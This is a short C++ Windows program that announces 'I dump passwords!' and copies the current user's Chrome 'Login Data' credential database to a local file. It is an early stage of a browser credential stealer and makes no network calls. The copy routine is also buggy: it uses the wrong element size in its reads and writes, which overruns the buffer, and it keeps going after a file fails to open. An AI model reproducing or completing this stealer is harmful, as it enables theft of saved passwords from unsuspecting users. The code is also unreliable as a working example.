
#include "sqlite3.h"
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include <string>

void CopyFiles(char * dst, char * src){
     //GetFileSize
    DWORD fileSize;
    char* buffer;
    fflush(stdin);
    FILE * infile = fopen(src, "r");
    if (infile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    int size;
    
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);

    printf("SIZE: %d\n", size);

    buffer = (char *)malloc(size);

    fread(buffer,sizeof(char *), size, infile );
    fclose(infile);
    //for (int i = 0; i < size; i++){
      //  printf("%c", buffer[i]);
    //}
    FILE * outfile = fopen(dst, "w+");
    if (outfile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    fwrite(buffer, sizeof(char *), size, outfile );
    fclose(outfile);
    free(buffer);
}

int main(){
    printf("I dump passwords!\n");
    HANDLE hToken =  GetCurrentProcessToken();

    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        return -1;
    }
    std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data");
    printf("%s\n", const_cast<char*>(db_path.c_str()));
    //copy the file contents to a new file
    std::string temp = "ChromeData.db";
    //std::string a = "a.txt";
    //std::string b = "b.txt";
    //CopyFiles(const_cast<char*>(b.c_str()), const_cast<char*>(a.c_str()));
    CopyFiles(const_cast<char*>(temp.c_str()), const_cast<char*>(db_path.c_str()));
   //C:\Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default"
    
}
